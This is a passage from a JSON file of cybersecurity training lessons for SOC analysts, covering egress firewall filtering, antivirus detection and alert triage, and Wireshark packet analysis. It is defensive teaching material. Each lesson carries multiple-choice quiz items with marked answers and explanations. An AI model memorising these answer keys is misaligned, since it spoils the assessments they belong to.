      "content": "Firewalls filter traffic in two directions, and a common beginner mistake is to focus only on one. Both directions carry security signal, and for a SOC the *less obvious* one is often the more valuable.\n\n**Ingress (inbound) filtering** controls traffic coming *into* the network from outside. This is the intuitive job of a firewall: keep attackers out. Ingress rules block unsolicited connections to internal services, so the internet cannot directly reach your servers' management ports, databases, or file shares. A firewall exposing something like Remote Desktop (port 3389) or a database port to the whole internet is the classic dangerous misconfiguration, because it invites direct attack.\n\n**Egress (outbound) filtering** controls traffic leaving the network. This is frequently neglected — many organisations allow almost all outbound traffic — but it is enormously important for detection, for one central reason: **after an attacker is already inside, their activity shows up as outbound traffic.**\n\nConsider what an intruder must do once they have a foothold:\n\n- **Command and control (C2)** — their malware reaches *out* to the attacker's server for instructions.\n- **Data exfiltration** — stolen data flows *out* of the network to somewhere the attacker controls.\n- **Downloading tools** — additional payloads are pulled *in*, initiated by an outbound request.\n\nEvery one of these crosses the firewall **outbound**. This is why **egress filtering** — restricting and closely watching what may leave — is such a powerful control. If internal machines are only allowed to reach approved destinations and ports, an attacker's C2 connection to an unknown server is blocked or, at minimum, logged as an anomaly. A blocked or unusual *outbound* connection is often the first sign that a machine inside your walls is compromised.\n\nThe takeaway for an analyst is to give outbound firewall activity as much attention as inbound. Inbound denials tell you who is knocking; **outbound denials and anomalies often tell you who is already inside and trying to phone home.** That reframing — the firewall as a detector of insiders reaching out, not just a wall against outsiders reaching in — is what makes firewall logs a live investigation tool rather than a passive barrier."
    },
    {
      "heading": "Reading Firewall Logs as an Analyst",
      "content": "Firewalls generate logs of the decisions they make, and those logs are among the most-used data sources in a SOC. Learning to read them turns the firewall from a silent barrier into a rich source of evidence.\n\n**What a firewall log entry contains.** A typical entry records the essentials of one connection decision:\n\n- The **action** — allowed or denied (blocked).\n- The **source and destination IP**, and the **ports** and **protocol** — the five-tuple.\n- A **timestamp**, and often the **rule** that matched, the **direction**, and bytes transferred.\n\nReading an entry is a matter of assembling these into a sentence: *\"at this time, traffic from this source to this destination on this port was allowed or denied by this rule.\"*\n\n**What analysts hunt for in firewall logs:**\n\n- **Denied inbound bursts** — many blocked connection attempts to a range of ports from one external source is **port scanning**, an attacker mapping what is exposed.\n- **Outbound connections to suspicious destinations** — an internal machine reaching out to a known-bad IP, a newly-registered domain, or an unusual country/port is a strong **C2 or exfiltration** signal. This is where egress visibility pays off.\n- **Large outbound data transfers** — an internal host sending an unusually large volume out can indicate **data exfiltration**.\n- **Traffic that should never happen** — a workstation connecting directly to the internet on an odd port, or one internal machine scanning many others (possible lateral movement).\n- **Allowed traffic to risky services** — connections reaching management ports that should be restricted.\n\n**How to use them.** Firewall logs are best as **one source among several**. On their own they show *that* a connection happened; combined with endpoint telemetry (which process made it) and threat intelligence (is that destination known-bad), they become conclusive. A classic pivot: a firewall log shows a workstation beaconing to an external IP every few minutes; you pivot to the endpoint's process tree to find *which* process is doing it, and to threat intel to confirm the destination — turning a firewall line into a full C2 detection.\n\nThe mindset is that the firewall is both a **control** (it blocks) and a **sensor** (it records). Even traffic it *allows* is logged, so firewall data helps you reconstruct what happened even when nothing was blocked. Used well — with special attention to outbound activity — firewall logs are often where the first thread of a real intrusion is pulled."
    }
  ],
  "keyTakeaways": [
    "A firewall allows or blocks each connection by matching its five-tuple (source/destination IP, source/destination port, protocol) against an ordered rulebase, where the first match usually wins and a well-configured firewall ends in default-deny (block anything not explicitly allowed).",
    "Firewalls vary in inspection depth: stateless packet filters check each packet alone, stateful firewalls track connections (allowing replies to permitted outbound requests), and NGFWs add application-awareness and content/threat inspection; they also run at the network edge or as host-based firewalls (Windows Defender Firewall, iptables).",
    "Both directions matter, but egress (outbound) filtering is the under-used, high-value control: an attacker who is already inside reveals themselves through outbound C2, data exfiltration, and tool downloads, so a blocked or unusual outbound connection is often the first sign of compromise.",
    "Firewall logs record the action (allow/deny), five-tuple, time, and matched rule; analysts hunt denied inbound bursts (port scanning), outbound connections to suspicious destinations (C2/exfil), large outbound transfers, and traffic that should never happen — then pivot to endpoint and threat-intel to confirm."
  ],
  "quiz": [
    {
      "question": "Why is egress (outbound) firewall filtering considered such a valuable detection control, even though a firewall's most intuitive job is blocking inbound attacks?",
      "options": [
        {
          "label": "Because outbound filtering encrypts all leaving traffic, which is the only way to prevent an external attacker from ever scanning the network's open ports.",
          "value": "a"
        },
        {
          "label": "Because once an attacker is already inside, their command-and-control, data exfiltration, and tool downloads all cross the firewall outbound, so egress control catches them.",
          "value": "b"
        },
        {
          "label": "Because outbound rules are the only rules a firewall logs, so inbound traffic decisions are never recorded and cannot be reviewed by an analyst afterward.",
          "value": "c"
        },
        {
          "label": "Because egress filtering automatically assigns IP addresses to internal hosts, replacing DHCP and ensuring every machine can reach the internet safely.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Egress filtering is powerful because an attacker who already has a foothold must reach outward — for C2 instructions, to exfiltrate data, and to download tools — so controlling and watching outbound traffic catches activity that inbound-only defence misses, and a blocked/unusual outbound connection is often the first sign of compromise. Option a wrongly claims egress encrypts traffic. Option c is false because firewalls log inbound decisions too. Option d confuses firewalls with DHCP."
    },
    {
      "question": "In firewall logs you see a single external IP generating hundreds of denied inbound connection attempts across many different ports within a minute. What does this pattern most likely represent?",
      "options": [
        {
          "label": "A stateful inspection failure, because a correctly configured firewall would have allowed all of these connections rather than denying any of them.",
          "value": "a"
        },
        {
          "label": "Port scanning, an attacker probing many ports to map which services are exposed, revealed here by the burst of denied attempts across different ports.",
          "value": "b"
        },
        {
          "label": "Normal web browsing, because loading a single modern website legitimately opens hundreds of simultaneous inbound connections from the server to the user.",
          "value": "c"
        },
        {
          "label": "Data exfiltration, because stolen data always leaves the network as a rapid series of denied inbound connections from an external address.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Many denied inbound attempts to a range of ports from one external source is the classic signature of port scanning — an attacker mapping which services are exposed — and the denials show the firewall refusing the probes. Option a misreads normal deny behaviour as a failure. Option c is wrong because web browsing is outbound-initiated by the user, not hundreds of inbound connections. Option d describes exfiltration, which is outbound, not denied inbound traffic."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/",
    "https://csrc.nist.gov/pubs/sp/800/41/r1/final",
    "https://attack.mitre.org/techniques/T1071/"
  ],
  "xp": 200,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-antivirus-fundamentals",
  "slug": "antivirus-fundamentals",
  "title": "Antivirus Fundamentals",
  "topic": "Endpoint Security",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Antivirus is the security control almost everyone has heard of — the software that scans for and removes malware. But for a SOC analyst, 'antivirus caught something' is the beginning of an investigation, not the end, and understanding how antivirus actually decides what is malicious (and what it inevitably misses) is essential to triaging its alerts correctly. This lesson explains what antivirus is, the detection methods it uses, what it does when it finds something, its real limitations, and how an analyst reads an antivirus alert — including the critical difference between a threat that was blocked and one that was merely detected.",
  "sections": [
    {
      "heading": "What Antivirus Is and How It Detects",
      "content": "**Antivirus (AV)** is software that detects, blocks, and removes malicious programs — malware — from a computer. It runs on endpoints (laptops, servers) and continuously watches for files and behaviours it recognises as harmful. It is the most established layer of endpoint defence, and for most machines it is the first automated line stopping known threats.\n\nThe core of antivirus is **how it decides something is malicious**, and there are several detection methods, each with different strengths. Knowing them explains both what AV catches and what it misses.\n\n- **Signature-based detection.** The classic method: the AV maintains a huge database of **signatures** — fingerprints of known malware, such as a file's hash or a distinctive byte pattern. When it scans a file, it checks whether the file matches a known signature. This is fast and accurate for *known* malware, but it is blind to anything new — a threat with no signature yet slips through. The analogy is recognising a known criminal from a wanted-poster photo: excellent if you have the photo, useless for someone new.\n- **Heuristic detection.** To catch variants and unknown files, AV uses **heuristics** — rules and static analysis that look for *suspicious characteristics* rather than an exact match: code that resembles known malware families, suspicious structure, or known-bad techniques. Heuristics catch more, but at the cost of occasional **false positives** (flagging benign files).\n- **Behaviour-based detection.** Rather than judging a file at rest, this watches what a program *does when it runs* — if it starts encrypting many files, injecting into other processes, or modifying system settings, it is flagged by behaviour even if its file was unknown. This catches novel and fileless threats that static methods miss.\n- **Machine learning and cloud reputation.** Modern AV adds ML models trained to distinguish malicious from benign files, and **cloud reputation** lookups that check a file's prevalence and history across millions of machines — a brand-new, rare, unsigned file is inherently more suspicious.\n\nMost real antivirus blends all of these. The key insight for an analyst is that **each method has a blind spot**: signatures miss the new, heuristics can false-positive, behaviour needs the threat to run first. That layered-but-imperfect nature is exactly why AV alerts require human judgement, and why AV is one layer rather than the whole defence."
    },
    {
      "heading": "Scanning Modes and What AV Does on a Detection",
      "content": "Antivirus applies its detection methods in two timing modes, and takes specific actions when it finds something — both of which shape the alerts an analyst sees.\n\n**Real-time (on-access) scanning.** The AV inspects files *as they are accessed* — created, opened, downloaded, or executed — and can block a threat before it runs. This is the always-on protection that stops a malicious download the moment it lands. It is the most important mode for prevention, because it acts at the instant of danger.\n\n**On-demand scanning.** A scan the user or admin runs deliberately — a full or targeted sweep of the disk — to find dormant threats that may have been missed or that arrived before protection was in place. Scheduled scans are a form of this.\n\n**What AV does when it detects a threat.** The action taken is crucial for an analyst to understand, because it determines whether the threat was neutralised:\n\n- **Quarantine** — the most common action: the AV isolates the file, moving it to a secure, locked location where it cannot execute, while preserving it (so it can be restored if it was a false positive, or analysed). A quarantined threat is contained.\n- **Block / prevent** — the AV stops the malicious action from happening at all (for example, preventing execution).\n- **Remove / delete / clean** — the AV deletes the malicious file or attempts to remove malicious parts from an infected file.\n- **Allow / detect only** — in some configurations, or when it lacks permission, the AV *reports* the detection but does **not** stop it. This is the dangerous case, covered in the final section.\n\nAlongside the action, the AV records a **detection name** — a label like `Trojan:Win32/...` — that identifies what it thinks it found. These names are vendor-specific and sometimes generic, so they are a starting hint, not a definitive verdict.\n\nThe practical point is that **a detection and a successful response are two different things**. The most important question when an AV alert arrives is not just \"what did it find?\" but \"**what did it actually do about it — and did that succeed?**\" A quarantined or blocked threat is contained; a merely-detected one may still be active. Reading that action correctly is the heart of AV alert triage."
    },
    {
      "heading": "The Limits of Antivirus — and AV vs EDR",
      "content": "Antivirus is essential, but understanding its **limits** is what separates a novice who trusts every green checkmark from an analyst who knows when to keep digging.\n\n**What antivirus struggles with:**\n\n- **Zero-day and novel malware.** Signature-based detection is blind to threats it has never seen, and even heuristics and ML miss genuinely new techniques. Fresh malware routinely evades AV for a window of time.\n- **Fileless and living-off-the-land attacks.** Much modern intrusion uses no malicious *file* at all — abusing legitimate tools like PowerShell, WMI, and built-in binaries (LOLBins). Traditional file-scanning AV has little to grab onto when there is no file to scan.\n- **Evasion techniques.** Attackers deliberately defeat AV by **packing** and **obfuscating** their code (changing its appearance to break signatures), encrypting payloads, and testing their malware against AV engines before deploying it. Some malware also tries to disable the AV outright.\n- **In-memory and injected code.** Code running only in memory, or injected into a trusted process, may never touch disk where file scanning looks.\n\nThese gaps are exactly why the industry moved beyond classic AV, and it is worth being clear on the vocabulary:\n\n- **Traditional AV** focuses on detecting and blocking known-bad *files*, mostly at the moment of access. It answers \"is this file malicious?\"\n- **NGAV (Next-Generation Antivirus)** strengthens this with heavier behaviour analysis, ML, and cloud reputation to catch more of the unknown and fileless threats.\n- **EDR (Endpoint Detection and Response)** goes further still: rather than only blocking, it **records** endpoint activity continuously (processes, connections, file and registry changes) so analysts can *hunt, investigate, and respond* to threats that got past prevention — including the fileless and in-memory attacks AV misses. (EDR has its own lesson.)\n\nThe relationship is layered, not either/or: AV/NGAV is the **prevention** layer that stops the majority of known and obvious threats automatically, and EDR is the **detection and response** layer that gives analysts visibility into what prevention missed. A mature endpoint strategy runs both. For an analyst, the mental model is that **antivirus is a strong filter, not a guarantee** — a clean AV result narrows the odds but never proves a machine is safe, which is why AV alerts feed into a broader investigation rather than closing it."
    },
    {
      "heading": "Reading Antivirus Alerts as an Analyst",
      "content": "When an antivirus alert reaches the SOC, the analyst's job is to interpret it correctly and decide what to do next. A few fields and one critical distinction drive that triage.\n\n**What an AV alert contains:**\n\n- The **detection name** — what the AV thinks it found (e.g. a trojan, a specific family, or a generic label). Treat this as a lead, not a final verdict.\n- The **file path and hash** — *what* was detected and *where* it sat. The path is telling: malware in a user's Temp or Downloads folder, or masquerading in a system directory, is more suspicious than a flagged file in an expected location.\n- The **action taken** — quarantined, blocked, removed, or only detected/allowed.\n- The **host and user**, and the **timestamp**.\n\n**The single most important question: was it actually stopped?** The difference between \"**quarantined/blocked**\" and \"**detected but not remediated**\" changes everything:\n\n- A threat that was **quarantined or blocked** is contained. You still investigate how it arrived and whether it acted first, but the immediate danger is handled.\n- A threat that was **detected but not quarantined or blocked** — because of a permission issue, an error, or the AV being configured to detect-only — means **the malicious file may still be present and active.** This is a high-priority situation: the AV saw the threat and did *not* stop it, so containment now falls to you.\n\nThis is why an analyst never reads an AV alert as simply \"AV handled it.\" You read the *action*, and if it is anything other than a clean quarantine/block, you treat the host as potentially compromised.\n\n**How AV alerts fit the bigger picture.** A single AV detection is a thread to pull, not a closed case, because AV catches the *symptom* it recognised while the rest of an intrusion may be invisible to it. Sound triage pivots outward:\n\n- **To the endpoint / EDR** — what process dropped or launched the file? What is its process tree (recall that lesson)? Did anything else run around the same time?\n- **To repetition and spread** — is the same detection firing on other machines (a campaign or worm)?\n- **To what preceded it** — a phishing email, a suspicious download, a new scheduled task or service.\n\nThe overarching mindset: **antivirus tells you what it managed to recognise, which is a lower bound on what happened, not the whole story.** A blocked detection is reassuring but still worth understanding; an unblocked detection is an active incident. Reading the action correctly, and pivoting from the AV alert into the endpoint's fuller telemetry, is how a routine antivirus notification becomes a properly scoped investigation."
    }
  ],
  "keyTakeaways": [
    "Antivirus detects malware using layered methods — signature (fingerprints of known-bad, fast but blind to the new), heuristics (suspicious characteristics, can false-positive), behaviour (what a program does at runtime), and ML/cloud reputation — each with a blind spot, which is why AV needs human judgement.",
    "AV scans in real-time (on-access, blocking threats as files are used) and on-demand (deliberate sweeps), and on a detection it quarantines (isolates), blocks, removes, or in some cases only detects/allows — recording a vendor-specific detection name that is a lead, not a verdict.",
    "AV struggles with zero-day/novel malware, fileless/living-off-the-land attacks, evasion (packing/obfuscation), and in-memory/injected code; NGAV adds behaviour/ML and EDR adds continuous recording for hunt and response — AV is the prevention layer, EDR the detection/response layer, and both run together.",
    "When triaging an AV alert, the critical question is the action taken: quarantined/blocked means contained, but detected-but-not-remediated means the threat may still be active (high priority) — then pivot to endpoint/EDR (what process dropped it, its process tree), check for spread, and look at what preceded it, because AV shows only what it recognised."
  ],
  "quiz": [
    {
      "question": "An antivirus alert shows a trojan was 'detected' on a workstation, but the action field reads 'not remediated' rather than 'quarantined'. Why should this raise your priority, and what should you assume?",
      "options": [
        {
          "label": "It is lower priority, because 'detected' always means the antivirus fully removed the threat and 'not remediated' simply confirms cleanup finished successfully.",
          "value": "a"
        },
        {
          "label": "The AV saw the threat but did not stop it, so the malicious file may still be present and active, making containment your responsibility now.",
          "value": "b"
        },
        {
          "label": "It means the file was a guaranteed false positive, because antivirus only ever leaves genuinely harmless files unremediated and blocks all real malware.",
          "value": "c"
        },
        {
          "label": "It proves the workstation has no antivirus installed, since a real antivirus product is technically incapable of detecting without also removing.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A detection with no successful remediation means the AV recognised the threat but did not quarantine or block it, so the malicious file may still be present and active — a high-priority situation where containment now falls to the analyst. Option a wrongly equates 'detected' with removed. Option c falsely assumes unremediated means false positive. Option d is wrong because AV can detect without remediating (due to permissions, errors, or detect-only configuration) while still being installed."
    },
    {
      "question": "Why is a modern intrusion that abuses PowerShell and other built-in tools (a fileless / living-off-the-land attack) often able to evade traditional signature-based antivirus?",
      "options": [
        {
          "label": "Because traditional AV focuses on scanning malicious files, and a fileless attack uses legitimate built-in tools with no malicious file to match a signature against.",
          "value": "a"
        },
        {
          "label": "Because PowerShell automatically disables all antivirus products the moment it launches, leaving the endpoint completely without any protection at all.",
          "value": "b"
        },
        {
          "label": "Because signature-based antivirus only scans network traffic and never inspects any programs or scripts running locally on the endpoint itself.",
          "value": "c"
        },
        {
          "label": "Because living-off-the-land attacks are encrypted end to end, so antivirus is contractually forbidden by the vendor from inspecting them.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Traditional signature-based AV is built to recognise malicious files, but a fileless/living-off-the-land attack abuses legitimate built-in tools like PowerShell and leaves little or no malicious file to match a signature against, so it slips past file-scanning. Option b is false because PowerShell does not automatically disable AV. Option c is wrong because AV does scan local files and programs, not only network traffic. Option d invents a contractual restriction that does not exist."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/defender-endpoint/next-generation-protection",
    "https://attack.mitre.org/techniques/T1562/001/",
    "https://csrc.nist.gov/glossary/term/antivirus_software"
  ],
  "xp": 200,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-pcap-wireshark-for-beginners",
  "slug": "network-traffic-analysis-pcap-wireshark",
  "title": "Network Traffic Analysis with PCAP & Wireshark: A Beginner's Guide",
  "topic": "Network Security",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Logs tell you what a system decided to record. A packet capture tells you what actually crossed the wire — the raw conversation between two computers, exactly as it happened. For a SOC analyst, being able to open a capture and read it is like a detective being able to replay the security-camera footage instead of relying on witness statements. This beginner lesson introduces packet captures from scratch: what a packet and a PCAP are, how to read a captured packet in Wireshark, how filtering lets you find the one conversation that matters among millions, and what suspicious traffic actually looks like.",
  "sections": [
    {
      "heading": "What a Packet and a PCAP Are",
      "content": "Everything that travels across a network moves in small chunks called **packets**. When your computer loads a web page, sends an email, or talks to a server, that data is broken into many packets, each sent individually and reassembled at the other end. A **packet** is the basic unit of network communication — a small bundle carrying a piece of data plus addressing information (where it came from, where it is going, and which protocol it speaks).\n\nA **PCAP** — short for **packet capture** — is a recording of those packets, saved to a file. Just as a video recorder captures frames of what happened in a room, a packet capture records the packets that crossed a network link. The files usually end in `.pcap` or the newer `.pcapng`, and each one holds a slice of network history you can replay and examine packet by packet, long after the traffic itself is gone.\n\n**The tools.** The classic tool for viewing and analysing captures is **Wireshark**, a free graphical program that opens a PCAP and lets you explore every packet visually. Its command-line relatives are **tcpdump** (widely used on Linux to capture and display packets) and **tshark** (Wireshark's command-line version). Analysts use the CLI tools to *capture* traffic on a server and Wireshark to *analyse* the result in depth.\n\n**Where captures come from.** To capture traffic you have to be able to *see* it. That happens in a few ways: capturing directly on a host (recording that one machine's own traffic), or capturing at a network chokepoint using a **SPAN/mirror port** on a switch or a network **TAP** that copies traffic to a monitoring sensor. In a SOC you most often *receive* a capture — from an IDS/IPS sensor, a full-packet-capture appliance, or an incident responder — and your job is to read it.\n\nThe reason captures are so valuable is that they are **ground truth**. A firewall log says \"a connection to this IP was allowed\"; the packet capture shows you the *actual content and behaviour* of that connection — what was said, how often, and whether it looks like a browser, a file transfer, or malware phoning home. When logs are ambiguous, the packets settle the question."
    },
    {
      "heading": "Wireshark and the Anatomy of a Captured Packet",
      "content": "Open a capture in Wireshark and the window is divided into **three panes**, each a different zoom level on the same data. Learning what they show is the foundation of packet analysis.\n\n**1. The packet list (top).** A scrolling table with one row per packet. Its columns summarise each packet at a glance:\n\n- **No.** — the packet's number in the capture.\n- **Time** — when it was captured (relative to the start).\n- **Source** and **Destination** — the IP addresses talking.\n- **Protocol** — the highest-level protocol Wireshark recognised (HTTP, DNS, TCP, TLS…).\n- **Length** — the packet's size in bytes.\n- **Info** — a plain-language summary of what the packet is doing.\n\nThis is where you skim for the interesting traffic. Wireshark also **colour-codes** rows by type, so anomalies and errors stand out.\n\n**2. The packet details (middle).** Click one packet and this pane expands it into its **layers**, which you can unfold like nested folders. This reflects how networking really works: each packet is wrapped in layers, from the physical frame up to the application data:\n\n- **Frame / Ethernet** — the lowest layer, with hardware (MAC) addresses.\n- **IP** — the source and destination IP addresses (which machines).\n- **TCP or UDP** — the ports (which service) and, for TCP, connection flags.\n- **Application** — the actual content: the HTTP request, the DNS query, the TLS handshake.\n\nReading these layers top-to-bottom answers *who* (IP), *what service* (port/protocol), and *what was said* (application data) for that one packet.\n\n**3. The packet bytes (bottom).** The raw packet in hexadecimal and ASCII — the actual bytes on the wire. Beginners rarely need this, but it is where you can see raw content, including, alarmingly, plaintext data in unencrypted protocols.\n\nThe mental model to build: the **list** is your index, the **details** decode one packet into its layers, and the **bytes** are the ground truth underneath. Most analysis lives in the list and details panes — skim the list to find candidates, then drill into details to understand exactly what a packet is."
    },
    {
      "heading": "Filtering: Finding the Needle in Millions of Packets",
      "content": "A few minutes of network traffic can be *millions* of packets. Nobody reads them all — the essential skill is **filtering**, telling Wireshark to show only the packets you care about. There are two kinds of filter, and confusing them is a classic beginner mistake.\n\n**Capture filters** decide which packets are *recorded in the first place*. They are set before capturing and use a syntax called BPF (for example `host 10.0.0.5` to record only traffic to/from that IP). Because they discard everything else permanently, they are used to keep captures small — but you can never get back what you did not capture.\n\n**Display filters** decide which of the *already-captured* packets are *shown*. They do not delete anything; they just hide the noise so you can focus, and you change them freely as your investigation moves. This is the filter you will use constantly, typed into the bar at the top of Wireshark. Its syntax is different from capture filters and worth learning, because a handful of expressions cover most work:\n\n- `ip.addr == 10.0.0.5` — packets to or from that IP.\n- `tcp.port == 443` — traffic on port 443 (HTTPS).\n- `http` — only HTTP packets; `dns` — only DNS; `tls` — only TLS.\n- `ip.src == 10.0.0.5 && dns` — combine conditions with `&&` (and), `||` (or), `!` (not).\n- `tcp.flags.syn == 1 && tcp.flags.ack == 0` — connection-opening SYN packets (useful for spotting scans).\n\nThe workflow is to start broad and narrow down. See something odd from one IP? Filter to `ip.addr == <that IP>` to isolate its whole conversation. Suspect DNS abuse? Filter to `dns` and scan the queries. Each filter strips away the irrelevant, so the meaningful traffic rises to the top.\n\nThe key distinction to remember: **capture filters limit what you keep; display filters limit what you see.** For analysis in the SOC, you are almost always working with display filters on a capture someone already collected — so mastering the display-filter bar is the single most practical Wireshark skill a beginner can build."
    },
    {
      "heading": "Following the Conversation and Reading Statistics",
      "content": "Individual packets are pieces of a larger conversation. Two Wireshark features let you step back and see the whole exchange rather than one packet at a time.\n\n**Follow the stream.** Right-click a TCP packet and choose **Follow > TCP Stream**, and Wireshark reassembles every packet of that conversation into a single, readable view — showing the full back-and-forth between the two machines in order, with each side colour-coded. This is enormously powerful: instead of piecing together a request and response from scattered packets, you see the entire dialogue at once. For unencrypted protocols, this can reveal a complete HTTP request and the server's reply, the commands sent over a plaintext session, or — a serious finding — **credentials sent in the clear**. (For encrypted traffic like TLS/HTTPS, the stream shows scrambled content, so you rely on metadata: who talked to whom, when, and how much.)\n\n**The Statistics menu.** Rather than reading packets, sometimes you want the shape of the traffic. Wireshark's **Statistics** menu summarises a capture in ways that surface anomalies fast:\n\n- **Protocol Hierarchy** — what protocols make up the capture and in what proportion. An unexpected protocol, or a surprising amount of one, is a lead.\n- **Conversations** — every pair of machines that talked, with packet and byte counts. This instantly shows *who talked to whom the most* — a single internal host exchanging a large volume with an unfamiliar external IP jumps out here.\n- **Endpoints** — every individual address seen, so you can spot an unexpected participant.\n\nThese views turn a capture into a summary you can reason about. A common investigation move: open **Conversations**, sort by bytes, and notice one internal machine sending an unusually large amount of data to an external address — then filter to that conversation and **Follow the stream** to see what it was.\n\nThe pattern to internalise is **zoom out, then zoom in**. Statistics and Conversations give you the big picture and point at the suspicious pair; Follow-Stream and the details pane let you drill into exactly what that pair was doing. Beginners who learn this rhythm — summarise, spot the outlier, isolate it, read it — can get real answers out of a capture without drowning in individual packets."
    },
    {
      "heading": "What a SOC Analyst Hunts for in a Capture",
      "content": "Knowing the tool is only half the job; the other half is knowing *what suspicious traffic looks like*. A handful of patterns come up again and again, and each has a recognisable shape in a capture.\n\n**Command-and-control (C2) beaconing.** Malware that has infected a machine \"phones home\" to its operator on a schedule. In a capture this shows up as a machine making **small, regular, repeating connections** to the same external destination — every 30 seconds, every 5 minutes — with almost machine-like regularity. Human web browsing is bursty and varied; beaconing is metronomic. Wireshark's I/O graphs and the Conversations view help you spot the rhythm.\n\n**Data exfiltration.** Stolen data leaving the network appears as an **unusually large outbound transfer** — an internal host uploading far more than it downloads, to an external or unfamiliar destination. Sorting Conversations by bytes and watching the outbound direction is the fastest way to catch it.\n\n**Plaintext credentials and sensitive data.** Older or misconfigured protocols (FTP, Telnet, plain HTTP) send data unencrypted. Following such a stream can reveal usernames, passwords, or confidential content in the clear — both a finding about the attack and a hygiene problem to report.\n\n**DNS abuse.** DNS should be small lookups. Attackers abuse it for **tunnelling** (smuggling data inside DNS queries) and for reaching malicious domains. Filter to `dns` and watch for oddly long, random-looking domain names, a flood of queries to one domain, or lookups of known-bad domains.\n\n**Scanning and reconnaissance.** An attacker mapping the network generates **many connection attempts across many ports or hosts** — in a capture, a burst of SYN packets (`tcp.flags.syn == 1`) fanning out, often with few completed connections.\n\n**Unusual protocols or ports.** Traffic on ports that should not carry it, or a protocol appearing where it does not belong, is worth a look — attackers often use non-standard ports to evade simple controls.\n\nThe unifying method is the same one that runs through all of network analysis: **know what normal looks like, and hunt the deviation.** A capture is most powerful when combined with your other sources — a firewall log flags a connection, and the capture tells you it was beaconing; an EDR alert names a process, and the capture shows the data it sent. As a beginner, you do not need to catch everything at once. Start by opening a capture, filtering to one suspicious host, following its stream, and asking a single question: *does this conversation look like a human doing normal work, or like a machine doing something it should not?* That question, backed by the tools in this lesson, is the heart of network traffic analysis."
    }
  ],
  "keyTakeaways": [
    "A packet is the basic unit of network data, and a PCAP (.pcap/.pcapng) is a recorded file of packets — ground truth about what actually crossed the wire, viewed in Wireshark (GUI) or captured with tcpdump/tshark (CLI); analysts usually receive a capture from a sensor or responder and read it.",
    "Wireshark's three panes are the packet list (one row per packet: No./Time/Source/Destination/Protocol/Length/Info), the packet details (the packet unfolded into layers — Frame/Ethernet, IP, TCP/UDP, Application), and the raw bytes.",
    "Filtering is the core skill: capture filters (BPF) limit what is recorded, while display filters limit what is shown (ip.addr==, tcp.port==443, http, dns, combined with && || !) — in the SOC you mostly use display filters on a capture someone already collected.",
    "Zoom out then in: use Statistics > Conversations/Protocol Hierarchy to find the outlier pair, then Follow > TCP Stream to read the whole conversation; hunt for C2 beaconing (small regular repeats), large outbound exfil, plaintext credentials, DNS tunnelling, and scan bursts — always by comparing against normal."
  ],
  "quiz": [
    {
      "question": "You are analysing a packet capture and want to see only the traffic to and from the host 10.0.0.5 that is already recorded in the file, without deleting any other packets. Which type of filter do you use, and why?",
      "options": [
        {
          "label": "A capture filter, because capture filters are applied after recording to temporarily hide packets you do not currently want to look at in the file.",
          "value": "a"
        },
        {
          "label": "A display filter such as ip.addr == 10.0.0.5, because display filters hide the other already-captured packets without deleting them, and can be changed freely.",
          "value": "b"
        },
        {
          "label": "A capture filter such as host 10.0.0.5, because it is the only way to view specific traffic and it leaves all other packets fully visible in the capture.",
          "value": "c"
        },
        {
          "label": "Neither, because Wireshark cannot limit which packets are shown once a capture file has already been opened for analysis by the user.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A display filter (e.g. ip.addr == 10.0.0.5) limits which already-captured packets are shown without deleting anything and can be changed freely as the investigation moves — the right tool for analysing an existing capture. Option a reverses the definitions: capture filters are applied before/during recording, not after. Option c is wrong because a capture filter would have discarded other packets at capture time, and here the file already exists. Option d is false because filtering shown packets is a core Wireshark feature."
    },
    {
      "question": "In a capture you notice an internal workstation making a small connection to the same external IP address every 60 seconds, very regularly, over a long period. What does this pattern most likely indicate?",
      "options": [
        {
          "label": "Normal web browsing, because a person loading web pages naturally produces small, perfectly regular connections to one address once every 60 seconds.",
          "value": "a"
        },
        {
          "label": "Command-and-control beaconing, because infected malware phones home on a schedule, producing small, metronomic, repeating connections unlike bursty human traffic.",
          "value": "b"
        },
        {
          "label": "A large data-exfiltration transfer, because stolen data always leaves the network as tiny 60-second connections rather than as a single large outbound upload.",
          "value": "c"
        },
        {
          "label": "A port scan, because scanning a network is defined by one repeated connection to a single external IP address at a steady one-minute interval.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Small, highly regular, repeating connections to the same external destination are the classic signature of C2 beaconing — malware phoning home on a schedule, which is metronomic unlike the bursty, varied pattern of human browsing. Option a is wrong because real browsing is irregular and bursty. Option c misdescribes exfiltration, which appears as a large outbound transfer, not tiny periodic beacons. Option d is wrong because scanning fans out across many ports/hosts, not one address on a steady interval."
    }
  ],
  "references": [
    "https://www.wireshark.org/docs/wsug_html_chunked/",
    "https://wiki.wireshark.org/DisplayFilters",
    "https://www.tcpdump.org/manpages/tcpdump.1.html"
  ],
  "xp": 200,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-windows-forensic-artifacts",
  "slug": "windows-forensic-artifacts",
  "title": "Windows Forensic Artifacts: Proving What Happened on a Machine",
  "topic": "Windows Forensics",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "When you need to prove that a specific program ran on a Windows machine, or that a file existed, or which folders someone opened — even after the attacker tried to cover their tracks — you turn to forensic artifacts. These are the traces Windows leaves behind as a side effect of normal operation: little records scattered across the file system and registry that, read together, reconstruct what happened. This lesson introduces the artifacts a SOC analyst and incident responder rely on most: what each one proves, where it lives, and how they combine to tell the story of an intrusion when logs and EDR fall short.",
  "sections": [
    {
      "heading": "Why Forensic Artifacts Matter",
